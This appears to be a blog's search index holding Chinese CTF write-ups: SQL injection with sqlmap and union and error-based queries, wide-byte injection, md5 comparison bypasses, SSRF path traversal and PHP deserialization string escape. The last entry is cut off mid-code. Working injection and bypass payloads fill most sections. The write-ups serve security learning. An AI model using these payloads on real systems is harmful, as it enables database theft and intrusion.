<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bugku</title>
    <url>/2020/08/08/Bugku/</url>
    <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><a id="more"></a>

<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
  
1' and 1=2 #</code></pre></div>
<p>   不显示内容，可以判断存在注入点</p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`

  database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p>
<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p>
<p> 得到flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
<p><img src="/2020/08/08/Bugku/cjd1.png" srcset="/img/loading.gif" alt></p>
<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre></div><p><img src="/2020/08/08/Bugku/cjd2.png" srcset="/img/loading.gif" alt></p>
<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre></div><p><img src="/2020/08/08/Bugku/cjd3.png" srcset="/img/loading.gif" alt></p>
<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre></div><p><img src="/2020/08/08/Bugku/cjd4.png" srcset="/img/loading.gif" alt></p>
<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre></div><p><img src="/2020/08/08/Bugku/cjd5.png" srcset="/img/loading.gif" alt></p>
<hr>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">*/</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;
ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);
$str = substr($str,<span class="hljs-number">1</span>);
$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);
parse_str($str);
<span class="hljs-keyword">echo</span> md5($key1);

<span class="hljs-keyword">echo</span> md5($key2);
<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
<span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"取得flag"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>


<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<div class="hljs"><pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre></div><hr>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
<p>database:<strong>web1002-1</strong></p>
<p>爆表名</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre></div><p>flag1,hint</p>
<p>爆字段名</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre></div><p>flag1,address<br>获取内容</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre></div><p><strong>usOwycTju+FTUUzXosjr</strong></p>
<p>提交发现不对</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre></div><p>获取address中的内容</p>
<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre></div><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre></div><p>Unknown column ‘flag2’ in ‘where clause’</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre></div><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
<p><strong>！！！注意把flag改为小写字母</strong></p>
<hr>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre></div><p>加单引号报错</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre></div><p>查看所有的表</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre></div><p>查看表中的列</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre></div><p>0x637466 为十六进制ctf</p>
<p>获取字段内容</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre></div><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre></div><p>获取数据库名</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
 --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre></div><p>获取表名</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre></div><p>获取flag</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre></div><p><img src="/2020/08/08/Bugku/k1.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2020/08/16/SSTI/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" srcset="/img/loading.gif" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>STTI</tag>
      </tags>
  </entry>
  <entry>
    <title>guestbook</title>
    <url>/2020/04/18/Guestbook/</url>
    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><a id="more"></a>
<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
<div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span>
//id=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre></div>
<p>3被回显</p>
<p>1.查看数据库名</p>
<div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span></code></pre></div>

<p>数据库的名字<code>g8</code></p>
<p>2.查看表名</p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
<p>发现有一个表 <code>flag</code></p>
<p>3.测试表的字段</p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
<p>仍然显示<code>flag</code></p>
<p>4.读取flag   </p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>

<p>得到flag!</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>UNCTF</title>
    <url>/2020/11/17/UNCTF/</url>
    <content><![CDATA[<p>比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。</p>
<a id="more"></a>

<h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span><span class="hljs-string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
$url = $_GET[<span class="hljs-string">'url'</span>];
<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/unctf\.com/'</span>,$url))&#123;
    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;
        $url=file_get_contents($url);
        <span class="hljs-keyword">echo</span>($url);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'error!!'</span>);
    &#125;
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"error"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通</p>
<p>后来才知道考点根本不绕过。</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs coffeescript">?file=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../../flag
<span class="hljs-regexp">//</span>不唯一
?file=():unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag
<span class="hljs-regexp">//</span>()里可以填任意字符除了正则过滤的几个协议</code></pre></div>

<p><strong>原理：</strong>当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。</p>
<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p><strong>考察点是反序列化字符逃逸</strong></p>
<p>先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'aaaa'</span>;
    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;
&#125;
$AA=<span class="hljs-keyword">new</span> A();
$res=filter(serialize($AA));

$c=unserialize($res);
<span class="hljs-keyword">echo</span> $c-&gt;pass;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>利用反序列化逃逸修改pass的值。</p>
<p>正常的序列化结果</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div>

<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
<p>例如</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div>

<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
<p><img src="https://i.loli.net/2020/11/18/Ctefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
<p>例如想将pass变量的序列化字符串如下</p>
<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"pass"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:"hacker"</span>;&#125;</code></pre></div>

<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;'</span>;
    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;
&#125;
$AA=<span class="hljs-keyword">new</span> A();
var_dump(serialize($AA));
$res=filter(serialize($AA));
var_dump($res);
$c=unserialize($res);
<span class="hljs-keyword">echo</span> $c-&gt;pass;
<span class="hljs-comment">//echo unserialize($AA);</span>
<span class="hljs-comment">//";s:4:"pass";s:6:"hacker";&#125;</span>
<span class="hljs-meta">?&gt;</span>
   <span class="hljs-comment">//结果如下   ||为对齐</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">string(136) "O:1:"A":2:&#123;s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;";s:4:"pass";s:6:"123456";&#125;"||</span>
<span class="hljs-comment">string(163) "O:1:"A":2:&#123;s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";&#125;"||;s:4:"pass";s:6:"123456";&#125;"</span>
<span class="hljs-comment">hacker</span>
<span class="hljs-comment">*/</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" srcset="/img/loading.gif" alt="success.png"></p>
<p>这里pass的值就被该称了hacker</p>
<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
<p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html" target="_blank" rel="noopener">参考</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
highlight_file(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $uname;
    <span class="hljs-keyword">public</span> $password;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($uname,$password)</span></span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;uname=$uname;
        <span class="hljs-keyword">$this</span>-&gt;password=$password;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>
<span class="hljs-function">    </span>&#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">'easy'</span>)
            &#123;
                <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
                <span class="hljs-keyword">echo</span> $flag;    
            &#125;
            <span class="hljs-keyword">else</span>
            &#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">'wrong password'</span>;
            &#125;
        &#125;
    &#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);
&#125;

$uname=$_GET[<span class="hljs-number">1</span>];
$password=<span class="hljs-number">1</span>;
$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));
$test=unserialize($ser);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>这段代码的意思大致为，get方式提交一个1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
<p>需要构造的属性</p>
<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;&#125;</code></pre></div>

<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div>

<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $uname=<span class="hljs-string">'challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";s:4:"aaaa";s:1:"a";&#125;'</span>;
    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">"1"</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);
&#125;
$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));
<span class="hljs-keyword">echo</span>($ser);
<span class="hljs-meta">?&gt;</span></code></pre></div>



<div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">"uname"</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"easy"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;";s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"1"</span>;&#125;

<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre></div>

<p>finalpayload：</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge</span>";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div>

<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>给了提示  /source查看源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

$adminPassword = <span class="hljs-string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;
<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'fuxkSQL'</span>)) &#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuxkSQL</span><span class="hljs-params">($iText)</span>    </span>
<span class="hljs-function">    </span>&#123;
        $oText = $iText;
        $oText = str_replace(<span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'\\'</span>, $oText);
        $oText = str_replace(<span class="hljs-string">'\"'</span>, <span class="hljs-string">'"'</span>, $oText);
        $oText = str_replace(<span class="hljs-string">"\'"</span>, <span class="hljs-string">"'"</span>, $oText);
        $oText = str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"''"</span>, $oText);
        <span class="hljs-keyword">return</span> $oText;
    &#125;
&#125;
<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'getVars'</span>)) &#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getVars</span><span class="hljs-params">()</span></span>
<span class="hljs-function">    </span>&#123;
        $totals = array_merge($_GET, $_POST);
        <span class="hljs-keyword">if</span> (count($_GET)) &#123;
            <span class="hljs-keyword">foreach</span> ($_GET <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;
                <span class="hljs-keyword">global</span> $&#123;$key&#125;;
                <span class="hljs-keyword">if</span> (is_array($value)) &#123;
                    $temp_array = <span class="hljs-keyword">array</span>();
                    <span class="hljs-keyword">foreach</span> ($value <span class="hljs-keyword">as</span> $key2 =&gt; $value2) &#123;
                        <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;
                            $temp_array[$key2] = fuxkSQL(trim($value2));
                        &#125; <span class="hljs-keyword">else</span> &#123;
